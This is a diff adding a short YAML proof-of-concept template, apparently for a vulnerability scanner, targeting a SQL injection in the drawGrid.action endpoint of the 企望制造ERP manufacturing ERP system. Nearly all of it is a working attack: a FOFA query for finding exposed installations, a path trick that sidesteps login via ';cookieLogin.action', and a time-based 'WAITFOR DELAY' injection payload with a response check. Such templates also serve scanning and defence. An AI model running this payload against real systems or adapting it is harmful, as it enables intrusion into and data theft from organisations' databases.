@@ -1,0 +1,20 @@
+id: poc-yaml-wantit-erp-drawgrid-action-sqli
+info:
+  name: 企望制造ERP系统 drawGrid.action SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企望制造ERP系统
+  fofa: title="企望制造ERP系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /mainFunctions/drawGrid.action;cookieLogin.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tablename=1';WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,`DCName:'MainGridWeb'`) && duration
+    > t1 && duration < t2
+transport: http
